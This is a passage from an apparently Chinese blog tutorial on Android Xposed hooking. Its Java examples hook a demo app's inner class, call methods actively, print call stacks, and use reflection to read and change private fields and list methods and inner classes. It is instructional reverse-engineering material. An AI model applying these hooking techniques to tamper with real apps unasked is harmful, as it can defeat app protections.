class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;qian&quot;</span>);</span><br><span class="line">                        XposedHelpers.callMethod(clazz.newInstance(),<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;hou&quot;</span>);</span><br><span class="line">                        <span class="type">int</span> aa=XposedHelpers.getIntField(param.thisObject,<span class="string">&quot;innerPublicInt&quot;</span>);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;&quot;</span>+aa);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码是在“Hook内部类”基础上写的。主动调用就是调用一个app本身不会执行的方法，你主动让他执行。</p><p>说一下这个代码的变化之处。因为调用方法实例，肯定要有对象</p><ul><li>clazz.newInstance()：动态创建类的新对象</li><li>XposedHelpers.callMethod(Object obj, String methodName, Object… args):调用方法</li></ul><h3 id="执行结果-8">执行结果</h3><p>运行demo<br><img src="assets/image-20230715221315133.png" alt="image-20230715221315133"></p><h2 id="九-打印函数调用栈">九.打印函数调用栈</h2><h3 id="目标：打印函数调用栈，参看谁调用了innerFunc方法">目标：打印函数调用栈，参看谁调用了innerFunc方法</h3><h3 id="代码实现如下：">代码实现如下：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        Log.e(<span class="string">&quot;xiaojianbang&quot;</span>,<span class="string">&quot;Stack:&quot;</span>,<span class="keyword">new</span> <span class="title class_">Throwable</span>(<span class="string">&quot;Stack dump&quot;</span>));</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印函数调用栈一般用Log.e，这里就是再findAndHookMethod方法&quot;innerFunc&quot;时查看调用栈，看谁调用了&quot;innerFunc&quot;方法</p><ul><li>new Throwable()：抛出错误，查看栈信息</li></ul><h3 id="执行结果-9">执行结果</h3><p>运行demo<br><img src="assets/image-20230716152534518.png" alt="image-20230716152534518"></p><p>test调用了&quot;innerFunc&quot;方法。</p><p><strong>方法二：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">PrintStack</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------start----------------&quot;</span>);</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Throwable</span>();</span><br><span class="line">        StackTraceElement[] stackElements = ex.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (stackElements != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; stackElements.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">                XposedBridge.log(<span class="string">&quot;Dump Stack&quot;</span>+i+<span class="string">&quot;: &quot;</span>+ stackElements[i].getClassName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span>+stackElements[i].getFileName()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> + stackElements[i].getLineNumber()</span><br><span class="line">                        +<span class="string">&quot;----&quot;</span> +stackElements[i].getMethodName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Dump Stack: &quot;</span>+ <span class="string">&quot;---------------over----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;&lt;Start dump Stack !&gt;&quot;</span>);</span><br><span class="line">        e.fillInStackTrace();</span><br><span class="line">        Log.i(<span class="string">&quot;&lt;Dump Stack&gt;:&quot;</span>, <span class="string">&quot;++++++++++++&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="十-Java反射大法-获取方法">十.Java反射大法(获取方法)</h2><h3 id="目标：获得private方法image-20230716154434826">目标：获得private方法<img src="assets/image-20230716154434826.png" alt="image-20230716154434826"></h3><h3 id="代码实现如下-9">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                        Method  reflmethod=democlazz.getDeclaredMethod(<span class="string">&quot;refl&quot;</span>);</span><br><span class="line">                        reflmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        reflmethod.invoke(clazz.newInstance());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>步骤：</p><ol><li>找到类</li><li>找到字段或方法 设定访问权限</li><li>修改字段或调用方法</li></ol><ul><li>Class.forName(“包+类”,false,loadPackageParam.classLoader):加载refl方法所在的类。</li><li>getDeclaredMethod(“方法名”,“参数”):获取方法，getDeclaredMethod可以获取private方法，getMethod不可以获取private方法</li><li>setAccessible(true/false)：设置访问权限，private</li><li>invoke(Object obj, Object… args)：调用方法</li><li>xxx.getType()：获取字段类型</li><li>xxx.getName()：获取字段名字</li><li>xxx.getModifiers()：获取访问修饰符</li></ul><h3 id="执行结果：">执行结果：</h3><p>运行demo<br><img src="assets/image-20230716173137994.png" alt="image-20230716173137994"></p><h2 id="十一-反射大法-获取属性">十一.反射大法(获取属性)</h2><h3 id="目标：获得private字段并设置image-20230716180947881">目标：获得private字段并设置<img src="assets/image-20230716180947881.png" alt="image-20230716180947881"></h3><h3 id="代码实现如下-10">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        XposedHelpers.findAndHookMethod(</span><br><span class="line">                XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo$InnerClass&quot;</span>, loadPackageParam.classLoader),</span><br><span class="line">                <span class="string">&quot;innerFunc&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                       Class democlazz=Class.forName(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,<span class="literal">false</span>,loadPackageParam.classLoader);</span><br><span class="line">                       Field reffield=democlazz.getDeclaredField(<span class="string">&quot;reflect&quot;</span>);</span><br><span class="line">                       Object obj=clazz.newInstance();</span><br><span class="line">                       reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                       String str=(String)reffield.get(obj);</span><br><span class="line">                       Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是反射获取的字段 &quot;</span>+ str);</span><br><span class="line">                       reffield.set(obj,<span class="string">&quot;fanshedafa&quot;</span>);</span><br><span class="line">                       str=(String)reffield.get(obj);</span><br><span class="line">                        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;这是反射设置的字段 &quot;</span>+ str);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredField(String name)：获取属性，和getField区别如上面的getDeclaredMethod一样。</li><li>setAccessible(true/false)：设置访问权限，private</li><li>get(Object obj)：获取obj对象的对应属性的值</li><li>set(Object obj，Object value)：设置obj对象的对应属性的值</li></ul><h3 id="执行结果-10">执行结果</h3><p>运行demo<br><img src="assets/image-20230716182556152.png" alt="image-20230716182556152"></p><p>确实值被改变</p><h2 id="十二-遍历所有方法和字段">十二.遍历所有方法和字段</h2><h3 id="目标：遍历所有方法和字段">目标：遍历所有方法和字段</h3><h3 id="代码实现如下-11">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;Hooking...&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!loadPackageParam.packageName.equals(<span class="string">&quot;com.xiaojianbang.xposeddemo&quot;</span>)) <span class="keyword">return</span>;</span><br><span class="line">        Class&lt;?&gt; clazz=XposedHelpers.findClass(<span class="string">&quot;com.xiaojianbang.xposeddemo.Demo&quot;</span>,loadPackageParam.classLoader);</span><br><span class="line">        XposedHelpers.setStaticObjectField(clazz,<span class="string">&quot;Tag&quot;</span>,<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line">        Method[] md=clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;md.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,md[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] fd=clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;fd.length;i++)&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,fd[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>getDeclaredMethods()：获得所有方法，返回值是Method[]</li><li>getDeclaredFields()：获得所有属性，返回值是Field[]</li></ul><h3 id="执行结果-11">执行结果</h3><p>运行demo<br><img src="assets/image-20230716190331913.png" alt="image-20230716190331913"></p><h2 id="十三-遍历所有内部类">十三.遍历所有内部类</h2><h3 id="目标：遍历所有内部类">目标：遍历所有内部类</h3><h3 id="代码实现如下-12">代码实现如下</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="comment">//xposed全局过滤</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myhook</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//public final static String TAG = &quot;MyXposed&quot;;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Log.d(<span 